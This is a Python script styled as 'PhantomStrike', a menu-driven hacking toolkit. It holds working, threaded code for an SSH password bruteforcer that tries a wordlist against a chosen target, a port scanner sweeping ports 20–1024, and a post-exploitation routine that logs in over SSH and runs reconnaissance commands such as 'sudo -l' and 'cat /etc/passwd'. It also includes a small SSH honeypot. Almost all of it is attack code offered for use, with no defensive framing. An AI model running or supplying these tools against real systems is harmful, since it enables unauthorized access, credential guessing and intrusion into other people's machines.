import os
import threading
import socket
import paramiko
from colorama import init, Fore, Back, Style
import sys

init(autoreset=True)

# ===================== BANNER =====================

def print_banner():
    print(Fore.GREEN + """                                                       
 _____ _           _             _____ _       _ _       
|  _  | |_ ___ ___| |_ ___ _____|   __| |_ ___|_| |_ ___ 
|   __|   | .'|   |  _| . |     |__   |  _|  _| | '_| -_|
|__|  |_|_|__,|_|_|_| |___|_|_|_|_____|_| |_| |_|_,_|___|
                                                          """)
    print(Style.BRIGHT + Fore.CYAN + "[+] Welcome to PhantomStrike - The Ultimate Hacking Toolkit")

# ===================== CLEAR SCREEN =====================

def clear_screen():
    """Clear the screen depending on the OS."""
    if sys.platform == "win32":
        os.system('cls')  # Windows
    else:
        os.system('clear')  # Linux and macOS

# ===================== MAIN MENU =====================

def main_menu():
    print_banner()
    print(Fore.YELLOW + """
[1] SSH Bruteforcer
[2] SSH Honeypot
[3] Smart Port Scanner
[4] Post-Exploitation Pivot Tool
    """)

    choice = input(Fore.GREEN + "Choose an option: ").strip()

    if choice == "1":
        ssh_bruteforcer()
    elif choice == "2":
        ssh_honeypot()
    elif choice == "3":
        smart_port_scanner()
    elif choice == "4":
        post_exploitation_pivot()
    else:
        print(Fore.RED + "Invalid option.")
        main_menu()

# ===================== SSH BRUTEFORCER =====================

def ssh_bruteforcer():
    ip = input(Fore.YELLOW + "Target IP: ").strip()
    username = input(Fore.YELLOW + "Username: ").strip()
    wordlist_file = input(Fore.YELLOW + "Password list file: ").strip()

    try:
        with open(wordlist_file, "r") as f:
            passwords = f.read().splitlines()
    except FileNotFoundError:
        print(Fore.RED + "Password file not found.")
        return

    def try_password(password):
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(ip, username=username, password=password, timeout=5)
            print(Fore.GREEN + f"[+] Password Found: {password}")
            client.close()
        except paramiko.AuthenticationException:
            print(Fore.RED + f"[-] Wrong password: {password}")
        except Exception as e:
            print(Fore.RED + f"[!] Error: {e}")

    threads = []
    for pwd in passwords:
        t = threading.Thread(target=try_password, args=(pwd,))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

# ===================== SSH HONEYPOT =====================

def ssh_honeypot():
    HOST = '0.0.0.0'
    PORT = 2222
    banner = "SSH-2.0-OpenSSH_7.4\r\n"

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((HOST, PORT))
    server.listen(5)
    print(Fore.CYAN + f"[+] SSH honeypot listening on port {PORT}")

    while True:
        client, addr = server.accept()
        print(Fore.YELLOW + f"[!] Connection from {addr}")

        client.send(banner.encode())
        try:
            data = client.recv(1024)
            print(Fore.YELLOW + f"[DATA] {data}")
            with open("honeypot_log.txt", "a") as log:
                log.write(f"{addr[0]} tried: {data}\n")
        except:
            pass

        client.close()

# ===================== SMART PORT SCANNER =====================

def smart_port_scanner():
    target_ip = input(Fore.YELLOW + "Target IP: ").strip()
    ports = list(range(20, 1025))

    def scan_port(ip, port):
        s = socket.socket()
        s.settimeout(0.5)
        try:
            s.connect((ip, port))
            print(Fore.GREEN + f"[+] Port {port} is OPEN")
        except:
            pass
        finally:
            s.close()

    threads = []
    for port in ports:
        t = threading.Thread(target=scan_port, args=(target_ip, port))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

# ===================== POST EXPLOIT PIVOT =====================

def post_exploitation_pivot():
    ip = input(Fore.YELLOW + "Target IP: ").strip()
    username = input(Fore.YELLOW + "Username: ").strip()
    password = input(Fore.YELLOW + "Password: ").strip()

    commands = [
        "whoami",
        "hostname",
        "uname -a",
        "ifconfig",
        "sudo -l",
        "cat /etc/passwd",
    ]

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, username=username, password=password)

    for cmd in commands:
        print(Fore.CYAN + f"\n[+] Running: {cmd}")
        stdin, stdout, stderr = client.exec_command(cmd)
        output = stdout.read().decode()
        print(Fore.GREEN + output)

    client.close()

# ===================== RUN =====================

if __name__ == "__main__":
    try:
        clear_screen()  # Clear screen before starting
        main_menu()  # Start the main menu
    except KeyboardInterrupt:
        print(Fore.RED + "\n[!] Exiting program...")  # Graceful exit on Ctrl+C
